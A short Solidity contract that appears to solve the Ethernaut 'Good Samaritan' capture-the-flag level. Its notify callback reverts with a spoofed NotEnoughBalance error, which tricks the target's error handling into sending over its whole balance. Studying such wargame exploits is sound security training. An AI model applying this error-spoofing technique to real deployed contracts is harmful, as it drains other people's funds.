// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
import "./GoodSamaritan.sol";

contract Solution {
    error NotEnoughBalance();
    GoodSamaritan level;

    constructor(address _lvl) {
        level = GoodSamaritan(_lvl);
    }

    function attack() public {
        level.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
